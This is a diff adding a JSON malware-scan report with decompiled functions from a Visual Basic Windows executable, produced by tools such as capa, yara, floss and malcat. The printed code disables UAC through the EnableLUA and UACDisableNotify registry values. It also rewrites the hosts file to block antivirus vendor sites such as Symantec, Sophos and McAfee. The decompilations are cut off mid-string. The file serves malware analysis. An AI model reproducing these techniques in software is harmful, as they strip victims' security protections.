+        "decompilation": "\n/* DISPLAY WARNING: Type casts are NOT being printed */\n\nvoid sub_408d80(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    undefined4 *unaff_FS_OFFSET;\n    int32_t iStack_80;\n    undefined4 uStack_7c;\n    undefined4 uStack_74;\n    undefined4 uStack_6c;\n    undefined4 uStack_64;\n    undefined4 uStack_5c;\n    undefined4 uStack_54;\n    undefined4 uStack_4c;\n    undefined4 uStack_44;\n    undefined4 uStack_3c;\n    undefined4 uStack_34;\n    undefined4 uStack_2c;\n    undefined4 *puStack_24;\n    undefined4 uStack_1c;\n    undefined4 uStack_18;\n    undefined4 uStack_14;\n    code *pcStack_10;\n    undefined *puStack_c;\n    undefined4 uStack_8;\n    \n    pcStack_10 = jmp_msvbvm60.__vbaExceptHandler;\n    uStack_14 = *unaff_FS_OFFSET;\n    *unaff_FS_OFFSET = &uStack_14;\n    pcVar2 = msvbvm60.__vbaRedim;\n    puStack_c = &stack0xffffff44;\n    uStack_8 = 0x4013a8;\n    uStack_18 = 0;\n    uStack_1c = 0;\n    uStack_2c = 0;\n    uStack_3c = 0;\n    uStack_4c = 0;\n    uStack_5c = 0;\n    uStack_6c = 0;\n    uStack_7c = 0;\n    iStack_80 = 0;\n    (*msvbvm60.__vbaRedim)(0x880, 0x10, &uStack_1c, 0, 1, 3, 0);\n    pcVar1 = msvbvm60.__vbaVarMove;\n    puStack_24 = 0x11;\n    uStack_2c = 2;\n    (*msvbvm60.__vbaVarMove)();\n    uStack_34 = 1;\n    uStack_3c = 2;\n    (*pcVar1)();\n    uStack_4c = 2;\n    uStack_44 = 1;\n    (*pcVar1)();\n    uStack_54 = 0;\n    uStack_5c = 2;\n    (*pcVar1)();\n    func_0x004058c0(\"Ntdll.dll\", \"RtlAdjustPrivilege\", &uStack_1c);\n    (*msvbvm60.__vbaErase)(0, &uStack_1c);\n    (*pcVar2)(0x880, 0x10, &uStack_1c, 0, 1, 2, 0);\n    puStack_24 = 0x80000002;\n    uStack_2c = 3;\n    (*pcVar1)();\n    uStack_34 = (*msvbvm60.VarPtr)(\"SOFTWARE\\\\Microsoft\\\\Security Center\");\n    uStack_3c = 3;\n    (*pcVar1)();\n    uStack_44 = (*msvbvm60.VarPtr)(&uStack_18);\n    uStack_4c = 3;\n    (*pcVar1)();\n    iStack_80 = func_0x004058c0(\"advapi32.dll\", \"RegOpenKeyW\", &uStack_1c);\n    (*msvbvm60.__vbaErase)(0, &uStack_1c);\n    if (iStack_80 == 0) {\n        (*pcVar2)(0x880, 0x10, &uStack_1c, 0, 1, 5, 0);\n        puStack_24 = &uStack_18;\n        uStack_2c = 0x4003;\n        (*msvbvm60.__vbaVarZero)();\n        uStack_34 = (*msvbvm60.VarPtr)(\"UACDisableNotify\");\n        uStack_3c = 3;\n        (*pcVar1)();\n        uStack_4c = 2;\n        uStack_44 = 0;\n        (*pcVar1)();\n        uStack_54 = 4;\n        uStack_5c = 2;\n        (*pcVar1)();\n        iStack_80 = 0;\n        uStack_64 = (*msvbvm60.VarPtr)(&iStack_80);\n        uStack_6c = 3;\n        (*pcVar1)();\n        uStack_74 = 4;\n        uStack_7c = 2;\n        (*pcVar1)();\n        iVar3 = func_0x004058c0(\"advapi32.dll\", \"RegSetValueExW\", &uStack_1c);\n        (*msvbvm60.__vbaErase)(0, &uStack_1c);\n        if (iVar3 == 0) {\n            (*pcVar2)(0x880, 0x10, &uStack_1c, 0, 1, 0, 0);\n            puStack_24 = &uStack_18;\n            uStack_2c = 0x4003;\n            (*msvbvm60.__vbaVarZero)();\n            func_0x004058c0(\"advapi32.dll\", \"RegCloseKey\", &uStack_1c);\n            (*msvbvm60.__vbaErase)(0, &uStack_1c);\n        }\n    }\n    (*pcVar2)(0x880, 0x10, &uStack_1c, 0, 1, 2, 0);\n    puStack_24 = 0x80000002;\n    uStack_2c = 3;\n    (*pcVar1)();\n    uStack_34 = (*msvbvm60.VarPtr)(\"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\");\n    uStack_3c = 3;\n    (*pcVar1)();\n    uStack_44 = (*msvbvm60.VarPtr)(&uStack_18);\n    uStack_4c = 3;\n    (*pcVar1)();\n    iStack_80 = func_0x004058c0(\"advapi32.dll\", \"RegOpenKeyW\", &uStack_1c);\n    (*msvbvm60.__vbaErase)(0, &uStack_1c);\n    if (iStack_80 == 0) {\n        (*pcVar2)(0x880, 0x10, &uStack_1c, 0, 1, 5, 0);\n        puStack_24 = &uStack_18;\n        uStack_2c = 0x4003;\n        (*msvbvm60.__vbaVarZero)();\n        uStack_34 = (*msvbvm60.VarPtr)(\"EnableLUA\");\n        uStack_3c = 3;\n        (*pcVar1)();\n        uStack_4c = 2;\n        uStack_44 = 0;\n        (*pcVar1)();\n        uStack_54 = 4;\n        uStack_5c = 2;\n        (*pcVar1)();\n        iStack_80 = 0;\n        uStack_64 = (*msvbvm60.VarPtr)(&iStack_80);\n        uStack_6c = 3;\n        (*pcVar1)();\n        uStack_74 = "
+      },
+      "21296": {
+        "name": "sub_405330",
+        "decompilation": "\n/* WARNING: Removing unreachable block (ram,0x004056dc) */\n\n/* DISPLAY WARNING: Type casts are NOT being printed */\n\nvoid sub_405330(int16_t **param_1,uint32_t *param_2)\n\n{\n    int16_t *piVar1;\n    code *pcVar2;\n    code *pcVar3;\n    undefined uVar4;\n    int16_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    code **ppcVar9;\n    undefined4 uVar10;\n    int32_t iVar11;\n    code *pcVar12;\n    uint32_t uVar13;\n    undefined4 *unaff_FS_OFFSET;\n    bool bVar14;\n    int32_t iVar15;\n    uint32_t uStack_154;\n    uint32_t uStack_150;\n    undefined4 uStack_14c;\n    uint32_t *puStack_148;\n    code *pcStack_144;\n    uint32_t *puStack_140;\n    undefined4 uStack_13c;\n    undefined4 uStack_138;\n    undefined4 *puStack_134;\n    uint32_t uStack_130;\n    undefined4 uStack_12c;\n    code *pcStack_128;\n    uint32_t uStack_124;\n    code *pcStack_120;\n    undefined4 uStack_11c;\n    code *pcStack_118;\n    code **ppcStack_114;\n    undefined4 *puStack_110;\n    undefined4 uStack_10c;\n    undefined **ppuStack_108;\n    int16_t *piStack_104;\n    undefined **ppuStack_100;\n    code *pcStack_fc;\n    undefined4 uStack_f8;\n    undefined4 uStack_f4;\n    undefined4 uStack_f0;\n    int16_t **ppiStack_ec;\n    uint32_t uStack_e8;\n    undefined *puStack_e4;\n    undefined4 uStack_e0;\n    undefined4 uStack_dc;\n    undefined *puStack_d8;\n    undefined4 uStack_d4;\n    undefined4 uStack_d0;\n    uint32_t uStack_c0;\n    uint32_t uStack_bc;\n    undefined *puStack_8c;\n    undefined *apuStack_88 [5];\n    undefined4 auStack_74 [2];\n    undefined4 uStack_6c;\n    undefined4 uStack_64;\n    undefined4 uStack_60;\n    int32_t iStack_5c;\n    undefined auStack_54 [12];\n    int32_t iStack_48;\n    undefined auStack_38 [12];\n    int32_t iStack_2c;\n    undefined4 uStack_20;\n    uint32_t uStack_1c;\n    uint32_t uStack_18;\n    undefined4 uStack_14;\n    code *pcStack_10;\n    undefined *puStack_c;\n    undefined4 uStack_8;\n    \n    pcStack_10 = jmp_msvbvm60.__vbaExceptHandler;\n    uStack_14 = *unaff_FS_OFFSET;\n    *unaff_FS_OFFSET = &uStack_14;\n    pcVar12 = msvbvm60.__vbaAryConstruct2;\n    puStack_c = &stack0xffffff34;\n    uStack_8 = 0x4011f8;\n    uStack_d0 = 0x11;\n    uStack_60 = 0;\n    uStack_64 = 0;\n    auStack_74[0] = 0;\n    apuStack_88[0] = 0x0;\n    puStack_8c = 0x0;\n    uStack_d4 = 0x4027c0;\n    puStack_d8 = auStack_38;\n    uStack_dc = 0x405386;\n    (*msvbvm60.__vbaAryConstruct2)();\n    uStack_dc = 0x11;\n    uStack_e0 = 0x4027c0;\n    puStack_e4 = auStack_54;\n    uStack_e8 = 0x405393;\n    (*pcVar12)();\n    uStack_e8 = *param_2;\n    ppiStack_ec = 0x40539f;\n    (*msvbvm60.__vbaLenBstr)();\n    pcVar12 = msvbvm60.__vbaI2I4;\n    ppiStack_ec = 0x4053a9;\n    uStack_20 = (*msvbvm60.__vbaI2I4)();\n    pcVar3 = msvbvm60.__vbaI4Str;\n    ppiStack_ec = 0x402798;\n    uStack_f0 = 0x4053b9;\n    (*msvbvm60.__vbaI4Str)();\n    uStack_f0 = 0x4053bd;\n    uStack_1c = (*pcVar12)();\n    uStack_f0 = 0x402798;\n    uStack_f4 = 0x4053c7;\n    (*pcVar3)();\n    uStack_f4 = 0x4053cb;\n    uStack_18 = (*pcVar12)();\n    uStack_f4 = 0x4027a0;\n    uStack_f8 = 0x4053d5;\n    iVar6 = (*pcVar3)();\n    uStack_f8 = 0x402798;\n    pcStack_fc = 0x4053e2;\n    uVar7 = (*pcVar3)();\n    do {\n        if (iVar6 < uVar7) {\n            pcStack_fc = 0x402798;\n            ppuStack_100 = 0x405558;\n            (*pcVar3)();\n            ppuStack_100 = 0x40555c;\n            uStack_1c = (*pcVar12)();\n            ppuStack_100 = 0x4027a0;\n            piStack_104 = 0x405566;\n            iVar6 = (*pcVar3)();\n            piStack_104 = 0x402798;\n            ppuStack_108 = 0x405573;\n            uVar7 = (*pcVar3)();\n            goto code_r0x00405573;\n        }\n        pcStack_fc = 0x4027ac;\n        ppuStack_100 = 0x4053f7;\n        iVar8 = (*pcVar3)();\n        uVar13 = uVar7;\n        if (SCARRY4(iVar8, uStack_1c)) break;\n        pcStack_fc = 0x405407;\n        uStack_1c = (*pcVar12)();\n        if (uStack_20 < uStack_1c) {\n            pcStack_fc = 0x4027ac;\n            ppuStack_100 = 0x405417;\n            (*pcVar3)();\n            ppuStack_10"
+      },
+      "41900": {
+        "name": "sub_40a3ac",
+        "decompilation": "\n/* DISPLAY WARNING: Type casts are NOT being printed */\n\nvoid sub_40a3ac(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    undefined4 uVar3;\n    undefined4 *unaff_FS_OFFSET;\n    undefined4 auStack_44 [2];\n    undefined4 uStack_3c;\n    undefined4 uStack_34;\n    undefined4 auStack_30 [2];\n    undefined4 uStack_28;\n    undefined4 uStack_18;\n    code *pcStack_14;\n    undefined *puStack_10;\n    undefined4 uStack_c;\n    \n    (*msvbvm60.__vbaErrorOverflow)();\n    pcStack_14 = jmp_msvbvm60.__vbaExceptHandler;\n    uStack_18 = *unaff_FS_OFFSET;\n    *unaff_FS_OFFSET = &uStack_18;\n    puStack_10 = &stack0xfffffe90;\n    uStack_c = 0x4013d0;\n    uStack_28 = 0;\n    auStack_30[0] = 0;\n    uStack_34 = 0;\n    uStack_3c = 0x80020004;\n    auStack_44[0] = 10;\n    (*msvbvm60.rtcFreeFile)(auStack_44);\n    (*msvbvm60.__vbaFreeVar)();\n    pcVar1 = msvbvm60.__vbaI2I4;\n    uVar3 = (*msvbvm60.__vbaI2I4)(\"C:\\\\WINDOWS\\\\system32\\\\drivers\\\\etc\\\\hosts\");\n    (*msvbvm60.__vbaFileOpen)(2, 0xffffffff, uVar3);\n    sub_40b640(\"127.0.2.5\\\\tsymantec.com\\\\r\\\\n\");\n    pcVar2 = msvbvm60.__vbaStrMove;\n    (*msvbvm60.__vbaStrMove)();\n    uStack_34 = 0;\n    uVar3 = (*pcVar2)();\n    uVar3 = (*pcVar1)(uVar3);\n    (*msvbvm60.__vbaPrintFile)(0x403780, uVar3);\n    (*msvbvm60.__vbaFreeStrList)(2, auStack_30, &uStack_34);\n    sub_40b640(\"127.0.2.5\\\\tsecurityresponse.symantec.com\\\\r\\\\n\");\n    (*pcVar2)();\n    uStack_34 = 0;\n    uVar3 = (*pcVar2)();\n    uVar3 = (*pcVar1)(uVar3);\n    (*msvbvm60.__vbaPrintFile)(0x403780, uVar3);\n    (*msvbvm60.__vbaFreeStrList)(2, auStack_30, &uStack_34);\n    sub_40b640(\"127.0.2.5\\\\tsarc.com\\\\r\\\\n\");\n    (*pcVar2)();\n    uStack_34 = 0;\n    uVar3 = (*pcVar2)();\n    uVar3 = (*pcVar1)(uVar3);\n    (*msvbvm60.__vbaPrintFile)(0x403780, uVar3);\n    (*msvbvm60.__vbaFreeStrList)(2, auStack_30, &uStack_34);\n    sub_40b640(\"127.0.2.5\\\\twww.sarc.com\\\\r\\\\n\");\n    (*pcVar2)();\n    uStack_34 = 0;\n    uVar3 = (*pcVar2)();\n    uVar3 = (*pcVar1)(uVar3);\n    (*msvbvm60.__vbaPrintFile)(0x403780, uVar3);\n    (*msvbvm60.__vbaFreeStrList)(2, auStack_30, &uStack_34);\n    sub_40b640(\"127.0.2.5\\\\twww.sophos.com\\\\r\\\\n\");\n    (*pcVar2)();\n    uStack_34 = 0;\n    uVar3 = (*pcVar2)();\n    uVar3 = (*pcVar1)(uVar3);\n    (*msvbvm60.__vbaPrintFile)(0x403780, uVar3);\n    (*msvbvm60.__vbaFreeStrList)(2, auStack_30, &uStack_34);\n    sub_40b640(\"127.0.2.5\\\\tsophos.com\\\\r\\\\n\");\n    (*pcVar2)();\n    uStack_34 = 0;\n    uVar3 = (*pcVar2)();\n    uVar3 = (*pcVar1)(uVar3);\n    (*msvbvm60.__vbaPrintFile)(0x403780, uVar3);\n    (*msvbvm60.__vbaFreeStrList)(2, auStack_30, &uStack_34);\n    sub_40b640(\"127.0.2.5\\\\twww.mcafee.com\\\\r\\\\n\");\n    (*pcVar2)();\n    uStack_34 = 0;\n    uVar3 = (*pcVar2)();\n    uVar3 = (*pcVar1)(uVar3);\n    (*msvbvm60.__vbaPrintFile)(0x403780, uVar3);\n    (*msvbvm60.__vbaFreeStrList)(2, auStack_30, &uStack_34);\n    sub_40b640(\"127.0.2.5\\\\tmcafee.com\\\\r\\\\n\");\n    (*pcVar2)();\n    uStack_34 = 0;\n    uVar3 = (*pcVar2)();\n    uVar3 = (*pcVar1)(uVar3);\n    (*msvbvm60.__vbaPrintFile)(0x403780, uVar3);\n    (*msvbvm60.__vbaFreeStrList)(2, auStack_30, &uStack_34);\n    sub_40b640(\"127.0.2.5\\\\tliveupdate.symantecliveupdate.com\\\\r\\\\n\");\n    (*pcVar2)();\n    uStack_34 = 0;\n    uVar3 = (*pcVar2)();\n    uVar3 = (*pcVar1)(uVar3);\n    (*msvbvm60.__vbaPrintFile)(0x403780, uVar3);\n    (*msvbvm60.__vbaFreeStrList)(2, auStack_30, &uStack_34);\n    sub_40b640(\"127.0.2.5\\\\twww.viruslist.com\\\\r\\\\n\");\n    (*pcVar2)();\n    uStack_34 = 0;\n    uVar3 = (*pcVar2)();\n    uVar3 = (*pcVar1)(uVar3);\n    (*msvbvm60.__vbaPrintFile)(0x403780, uVar3);\n    (*msvbvm60.__vbaFreeStrList)(2, auStack_30, &uStack_34);\n    sub_40b640(\"127.0.2.5\\\\tviruslist.com\\\\r\\\\n\");\n    (*pcVar2)();\n    uStack_34 = 0;\n    uVar3 = (*pcVar2)();\n    uVar3 = (*pcVar1)(uVar3);\n    (*msvbvm60.__vbaPrintFile)(0x403780, uVar3);\n    (*msvbvm60.__vbaFreeStrList)(2, auStack_30, &uStack_34);\n    sub_40b640(\"127.0.2.5\\\\tf-secure.com\\\\r\\\\n\");\n    (*pcVar2)();\n    uStack_34 = 0;\n    uVar3 = (*pcVar2)();\n    uVar3 = (*pcVar1)(uVar3);\n    (*msvbvm60.__v"
+      }
+    },
+    "script_decompile": null,
+    "unpack_result": null,
+    "errors": [],
+    "duration_s": 4.65
+  },
+  "_format": "pe",
+  "_timings": {
+    "capa": 1.51,
+    "pe_imports": 0.06,
+    "yara": 3.57,
+    "floss": 13.03,
+    "malcat": 4.65
+  },
+  "_stage": "quick_scan"
+}
